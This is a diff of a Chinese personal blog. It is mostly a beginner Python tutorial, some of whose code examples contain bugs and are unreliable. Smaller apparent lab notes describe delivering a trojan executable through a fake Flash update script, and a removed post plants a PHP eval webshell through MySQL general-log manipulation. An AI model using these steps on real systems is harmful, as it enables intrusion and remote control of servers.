+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:&#x27;30&#x27;&#125;</span><br><span class="line">for key,value in a.items():</span><br><span class="line">    print(key,value)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203204942107.png" alt="image-20231203204942107"></p>
+<ul>
+<li>遍历项</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:&#x27;30&#x27;&#125;</span><br><span class="line">for item in a.items():</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203205130828.png" alt="image-20231203205130828"></p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def 函数名():</span><br><span class="line">	代码</span><br></pre></td></tr></table></figure>
+
+<h4 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h4><p>定义了函数之后，就相当于有了一个具有某些功能的代码，想要让这些代码能够执行，需要调用它调用函数很简单的，通过**函数名()**即可完成调用</p>
+<h4 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h4><blockquote>
+<p><strong>定义，调用带有参数的函数</strong></p>
+<ul>
+<li>在定义函数的时候，小括号里写等待赋值的变量名</li>
+<li>在调用函数的时候，小括号里写真正要进行运算的数据</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def sum(a,b):</span><br><span class="line">	c = a + b</span><br><span class="line">	print(c)</span><br><span class="line">#调用	</span><br><span class="line">sum(10,20)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203211418016.png" alt="image-20231203211418016"></p>
+<blockquote>
+<ul>
+<li>定义时小括号中的参数，用来接收参数用的，称为“形参”</li>
+<li>调用时小括号中的参数，用来传递给函数用的，称为“实参”</li>
+</ul>
+</blockquote>
+<h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><p>想要在函数中把结果返回给调用者，需要在函数中使用return</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def sum(a,b):</span><br><span class="line">	c = a + b</span><br><span class="line">	return(c)</span><br><span class="line">#调用	</span><br><span class="line">a = sum(10,20)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203212223771.png" alt="image-20231203212223771"></p>
+<h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><ul>
+<li><p>局部变量:在面数内部定义的变量我们叫做局部变量</p>
+</li>
+<li><p>全局变量:定义在函数外部的变量我们称之为全局变量</p>
+</li>
+</ul>
+<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h4 id="文件的打开和关闭"><a href="#文件的打开和关闭" class="headerlink" title="文件的打开和关闭"></a>文件的打开和关闭</h4><ul>
+<li><strong>创建文件</strong></li>
+</ul>
+<p>在python，使用open函数，可以打开一个已经存在的文件，或者创建一个新文件open(文件路径，访问模式)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(文件的路径，模式)</span><br><span class="line">模式 ：w 可写</span><br><span class="line">	  r 可读</span><br><span class="line">open(&#x27;test.txt&#x27;,&#x27;w&#x27;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>打开文件</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = open(&#x27;test.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">#写入</span><br><span class="line">s.write(&quot;hello world&quot;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>文件关闭</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = open(&#x27;test.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">#写入</span><br><span class="line">s.write(&quot;hello world&quot;)</span><br><span class="line">#关闭</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<h4 id="文件的读写"><a href="#文件的读写" class="headerlink" title="文件的读写"></a>文件的读写</h4><ul>
+<li><strong>写数据</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#写数据write方法</span><br><span class="line">s = open(&#x27;test.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">s.write(&quot;hello world&quot;)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>w模式：如果文件存在会先清空原来的数据然后再写。</p>
+</li>
+<li><p>a模式：如果模式变为了a那么就会执行追加的操作。</p>
+</li>
+<li><p><strong>读数据</strong></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = open(&#x27;test.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line">s.write(&quot;hello world&quot;)</span><br><span class="line">con = s.read()</span><br><span class="line">#read是一字节的读，效率比较低</span><br><span class="line">con = s.readline()</span><br><span class="line">#readline是一行一行的读取但是只能读取一行</span><br><span class="line">con = s.readlines()</span><br><span class="line">#readlines可以按照行来读取﹑但是会将所有的数据都读取到并且以一个列表的形式返回</span><br></pre></td></tr></table></figure>
+
+<h4 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h4><p>通过文件操作，我们可以将字符串写入到一个本地文件。但是，如果是一个对象(例如列表、字典、元组等)，就无法直接写入到一个文件里，需要对这个对象进行序列化，然后才能写入到文件里。</p>
+<p>设计一套协议，按照某种规则，把内存中的数据转换为字节序列，保存到文件，这就是序列化，反之，从文件的字节序列恢复到内存中，就是反序列化。</p>
+<blockquote>
+<p>对象—》字节序列&#x3D;&#x3D;&#x3D;序列化</p>
+<p>字节序列–》对象&#x3D;&#x3D;&#x3D;反序列化</p>
+</blockquote>
+<ul>
+<li><strong>序列化</strong></li>
+</ul>
+<p>Python中提供了<strong>JSON</strong>这个模块用来实现数据的序列化和反序列化。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#默认情况下对象是无法写入到文件中﹑如果想写入到文件那么必须使用序列化操作</span><br><span class="line">#导入json模块</span><br><span class="line">import json</span><br><span class="line">#创建文件</span><br><span class="line">fp = open(&#x27;test.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">#定义列表</span><br><span class="line">name_list = [&#x27;zs&#x27;,&#x27;ls&#x27;]</span><br><span class="line">#序列化,将python对象变成json字符串</span><br><span class="line">namws = json.dumps(name_list)</span><br><span class="line">#写入文件</span><br><span class="line">fp.write(names)</span><br><span class="line">#关闭文件</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure>
+
+<p>#dump在将对象转换为字符串的同时，指定一个文件的对象然后把转换后的字符串写入到这个文件里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">fp = open(&#x27;test.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">name_list = [&#x27;zs&#x27;,&#x27;ls&#x27;]</span><br><span class="line">#namws = json.dumps(name_list)</span><br><span class="line">#fp.write(names)</span><br><span class="line">json.dump(name_list,fp)</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>反序列化</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">content = fp.read()</span><br><span class="line">#反序列化，loads</span><br><span class="line">result = json.loads(content)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">fp = open(&#x27;text.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line">#content = fp.read()</span><br><span class="line">#反序列化，loads</span><br><span class="line">#result = json.loads(content)</span><br><span class="line">result = json.loads(fp)</span><br></pre></td></tr></table></figure>
+
+<h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p>程序在运行过程中，由于我们的编码不规范，或者其他原因一些客观原因，导致我们的程序无法继续运行，此时，程序就会出现异常。如果我们不对异常进行处理，程序可能会由于异常直接中断掉。为了保证程序的健壮性,我们在程序设计里提出了异常处理这个概念。</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/01/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB/" data-id="clpotr3zi0000o0u468sndbaf" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/12/01/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB-python%E5%9F%BA%E7%A1%80/" data-id="clprnfur00001oku4assl094o" class="article-share-link">分享</a>
       
       
     </footer>
@@ -563,7 +957,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/29/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%92%8C%E7%BD%91%E9%A1%B5/">远程控制和网页</a>
+      <a class="article-title" href="/2023/11/29/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%92%8C%E7%BD%91%E9%A1%B5/">quasar远程控制和网页</a>
     </h1>
   
 
@@ -607,7 +1001,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>下载flash.js文件，在再网站中运行。</p>
-<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231129112024764.png" alt="image-20231129112024764"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231129112024764.png" alt="image-20231129112024764"></p>
 <p>下载flag.exe,并用vs打开flash.js。拉到最下面将引号里的地址改为本机地址后接下载的muma文件。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.55/flag.exe</span><br></pre></td></tr></table></figure>
 
@@ -858,7 +1252,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>sqlmap常用命令<br>-h                                           显示基本帮助信息</p>
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: sqlmap常用命令</span><br><span class="line">date: 2023-12-01 16:59:46</span><br><span class="line">tags:</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap常用命令<br>-h                                           显示基本帮助信息</p>
 <p>-hh                                         显示高级帮助信息</p>
 <p>–version                                显示版本号</p>
 <p>-v                                           详细等级（0-6 默认 1）</p>
@@ -1108,178 +1504,6 @@
     </div>
     <footer class="article-footer">
       <a data-url="http://example.com/2023/11/23/%E4%B8%8B%E8%BD%BDBurpSuite/" data-id="clplzuha2000dq8u43ppygqi2" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-phpMyAdmin" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/11/22/phpMyAdmin/" class="article-date">
-  <time class="post-time" datetime="2023-11-22T09:00:44.000Z" itemprop="datePublished">
-    <span class="post-month">11月</span><br/>
-    <span class="post-day">22</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/22/phpMyAdmin/">phpMyAdmin</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="phpMyAdmin使用"><a href="#phpMyAdmin使用" class="headerlink" title="phpMyAdmin使用"></a>phpMyAdmin使用</h2><p>在浏览器的地址栏中输入：localhost&#x2F;phpMyAdmin&#x2F;，回车，就可以进入phpMyAdmin主界面了。</p>
-<p>show variables like ‘%general%’(查看是否开启全局日志记录)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122100304037.png" alt="image-20231122100304037"></p>
-<p>设置开启全局日志记录 set global general_log&#x3D;ON</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122100613103.png" alt="image-20231122100613103"></p>
-<p>set global general_log_file&#x3D;’C:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;12.php’     将全局日志保存到12.php</p>
-<p>SELECT’<em><?phpinfo(); ?></em>‘     select查询 phpinfo返回php所有信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122152717224.png" alt="image-20231122152717224"></p>
-<p>在网页192.168.110.132&#x2F;12.php</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122150530446.png" alt="image-20231122150530446"></p>
-<p>SELECT<?php @eval($_POST[cmd]);?>添加一句话木马</p>
-<p>打开蚁剑，右键点击添加数据。</p>
-<p>输入<a target="_blank" rel="noopener" href="http://192.168.110.131/12.php">http://192.168.110.131/12.php</a></p>
-<p>链接码：cdm</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122171038082.png" alt="image-20231122171038082"></p>
-<p>保存，双击刚创建的地址。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122171159226.png" alt="image-20231122171159226"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/22/phpMyAdmin/" data-id="clplzuha00009q8u403xv7dxc" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-在centos中使用docker" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/11/21/%E5%9C%A8centos%E4%B8%AD%E4%BD%BF%E7%94%A8docker/" class="article-date">
-  <time class="post-time" datetime="2023-11-21T08:08:26.000Z" itemprop="datePublished">
-    <span class="post-month">11月</span><br/>
-    <span class="post-day">21</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/21/%E5%9C%A8centos%E4%B8%AD%E4%BD%BF%E7%94%A8docker/">在centos7中下载及使用docker</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="下载docker并使用镜像和容器"><a href="#下载docker并使用镜像和容器" class="headerlink" title="下载docker并使用镜像和容器"></a>下载docker并使用镜像和容器</h2><p>（可以进入win10管理员模式远程连接centos7并进入其管理员模式：ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#49;&#48;&#x2e;&#x31;&#x33;&#49;">&#x72;&#111;&#111;&#116;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#49;&#48;&#x2e;&#x31;&#x33;&#49;</a>）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yun update  (更新系统)</span><br><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">sudo yum-config-manager --add-repo http://mirrors.ustc.edu.cn/docker-ce/linux/centos/docker-ce.repo(添加yum)</span><br><span class="line">sudo yum install -y docker-ce</span><br></pre></td></tr></table></figure>
-
-<p>可以使用docker -v 查看docker是否下载</p>
-<p>在&#x2F;etc&#x2F;docker&#x2F;daemon.json文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json(进入)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在里面添加</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn&quot;]</span><br><span class="line">&#125;</span><br><span class="line">再 ctrl 加 ： 打开输入模式输入wq！（强制退出并保存）</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121192119422.png" alt="image-20231121192119422"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop docker</span><br><span class="line">systemctl status docker(打开docker)</span><br><span class="line">docker pull mysql:5.7(下载mysql57)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121193103854.png" alt="image-20231121193103854"></p>
-<ul>
-<li><strong>更新docker版本</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">删除原本的docker</span><br><span class="line">yum erase docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-selinux \</span><br><span class="line">                  docker-engine-selinux \</span><br><span class="line">                  docker-engine \</span><br><span class="line">                  docker-ce</span><br><span class="line">下载</span><br><span class="line">yum install docker-ce -y</span><br></pre></td></tr></table></figure>
-
-<p>输入docker -v 查看docker版本</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121193437411.png" alt="image-20231121193437411"></p>
-<p>输入docker images -a 查看所有镜像</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121194338577.png" alt="image-20231121194338577"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mysql57 -v mysql57:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -p 3306:3306 -d(如果3306已占用可改为3307)</span><br><span class="line"></span><br><span class="line">docker inspect mysql57</span><br><span class="line">docker exec -it mysql57 bash(进入容器)</span><br><span class="line">mysql -V (查看mysql57是否加进容器)</span><br><span class="line">exit(退出)</span><br><span class="line">docker pull phpmyadmin/phpmyadmin</span><br><span class="line">sudo docker run --name phpmyadmin --link mysql57:db -p 9998:80 -d phpmyadmin/phpmyadmin</span><br><span class="line">docker images(查看镜像是否有phpmyadmin/phpmyadmin)</span><br></pre></td></tr></table></figure>
-
-<p>登入网页192.168.110.131：9998进入网页，输入用户root，密码123456</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121195505684.png" alt="image-20231121195505684"></p>
-<h2 id="使用docker"><a href="#使用docker" class="headerlink" title="使用docker"></a>使用docker</h2><ul>
-<li><strong>docker基本命令</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker version    #查看docker版本</span><br><span class="line">docker cp --help  #帮助信息</span><br><span class="line">docker info       #查看docker系统</span><br><span class="line">docker stats      #查看docker的cpu</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>docker启动和停止</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker    #启动</span><br><span class="line">systemctl stop docker     #停止</span><br><span class="line">systemctl restart docker  #重启</span><br><span class="line">systemctl status docker   #查看docker服务状态</span><br><span class="line">systemctl enable docker   #设置开机启动docker服务</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>镜像命令</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker images                                 #查看本地存在的镜像</span><br><span class="line">docker images -a                              #查看所有镜像</span><br><span class="line">docker images -aq                             #查看所有镜像，只显示镜像id</span><br><span class="line">docker search mysql                           #在docker远程仓库搜索mysql的镜像</span><br><span class="line">docker search mysql--filter stars=3000        #在docker 远程仓库搜索mysql的镜像，且搜藏大于3000                                                的</span><br><span class="line">docker pull mysql                             #下载mysql镜像默认使用最新版的</span><br><span class="line">docker pull mysql:5.7                         #下载mysql 5.7版本的镜像</span><br><span class="line">docker rmi-f 镜像id                            #通过镜像id 删除镜像docker </span><br><span class="line">docker rmi -f $(docker images -aq)            #删除所有的镜像(递归删除)</span><br></pre></td></tr></table></figure>
-
-<p>REPOSITORY   镜像仓库源</p>
-<p>TAG                  镜像的标签</p>
-<p>IMAGE ID         镜像的id</p>
-<p>CREATED          镜像的创建时间</p>
-<p>SIZE 				  镜像的大小</p>
-<ul>
-<li><strong>容器命令</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看正在运行的容器docker ps</span><br><span class="line">#查看所有的容器docker ps -a</span><br><span class="line">#查看所有的容器,只显示容器的iddocker ps -aq</span><br><span class="line">#通过容器id 删除容器docker rm容器id</span><br><span class="line">#通过容器id 删除所有的容器docker rm -f $(docker ps -aq)</span><br><span class="line">#通过容器名字启动容器并进入到容器里docker run -it centos(容器名字)/bin/bash</span><br><span class="line">#从容器里退出，回到主机，且停止容器的运行exit</span><br><span class="line">#从容器里退出，回到主机，不停止容器的运行Ctrl + p +q</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>容器启动和停止</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#通过容器id 启动容器 docker start容器id</span><br><span class="line">#通过容器id重新启动容器 docker restart容器id</span><br><span class="line">#通过容器id 停止正在运行的容器 docker stop容器id</span><br><span class="line">#通过容器id 强制停止正在运行的容器 docker kill容器id</span><br><span class="line">#通过镜像的名字的以后台运行的方式进行启动(没有前台服务会停止) docker run -d centos</span><br><span class="line">#以后台方式启动nginx,起名 docker run -d --name nginx001 -p 80:8001 nginx</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>容器信息查看</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看容器的进程信息docker top容器id</span><br><span class="line">#查看容器的元数据(容器的具体信息)docker inspect容器id</span><br><span class="line">#进入正在运行的容器后开启一个新的终端，可以在里面操作docker exec -it 容器id /bin/bash</span><br><span class="line">#进入正在运行的容器后使用正在运行的终端，可以在里面操作docker attach容器id</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/21/%E5%9C%A8centos%E4%B8%AD%E4%BD%BF%E7%94%A8docker/" data-id="clplzuha3000fq8u47z7q2aj1" class="article-share-link">分享</a>
       
       
     </footer>
